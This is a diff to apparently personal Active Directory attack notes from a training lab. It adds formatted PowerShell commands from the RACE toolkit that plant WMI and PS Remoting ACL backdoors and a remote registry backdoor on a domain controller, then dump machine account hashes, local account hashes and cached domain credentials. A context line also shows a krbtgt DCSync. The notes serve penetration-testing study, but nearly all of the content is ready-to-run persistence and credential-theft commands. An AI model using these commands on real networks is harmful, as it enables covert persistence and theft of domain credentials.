@@ -214,18 +214,55 @@ SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 #### Attack
 ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit: `. C:\AD\Tools\RACE-master\RACE.ps1`
 - On local machine for student1:
+```powershell
 Set-RemoteWMI -SamAccountName student1 -Verbose
-• On remote machine for student1 without explicit credentials:
-Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2'
--Verbose
-• On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:
+```
+- On remote machine for student1 without explicit credentials:
+```powershell
+Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
+```
+- On remote machine with explicit credentials. Only root\cimv2 and nested namespaces:
+```powershell
 Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential
 Administrator -namespace 'root\cimv2' -Verbose
-• On remote machine remove permissions:
-Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2'
--Remove -Verbose
+```
+- On remote machine remove permissions:
+```powershell
+Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose
+```
 
+Using the RACE toolkit - PS Remoting backdoor not stable after August 2020 patches
+- On local machine for student1:
+```powershell
+Set-RemotePSRemoting -SamAccountName student1 -Verbose
+```
 
+- On remote machine for student1 without credentials:
+```powershell
+Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc 
+-Verbose
+```
+- On remote machine, remove the permissions:
+```powershell
+Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc 
+-Remove
+```
+- Using RACE or DAMP, with admin privs on remote machine
+```powershell
+Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
+```
+- As student1, retrieve machine account hash:
+```powershell
+Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
+```
+- Retrieve local account hash:
+```powershell
+Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
+```
+- Retrieve domain cached credentials:
+```powershell
+Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
+```
 
 
 
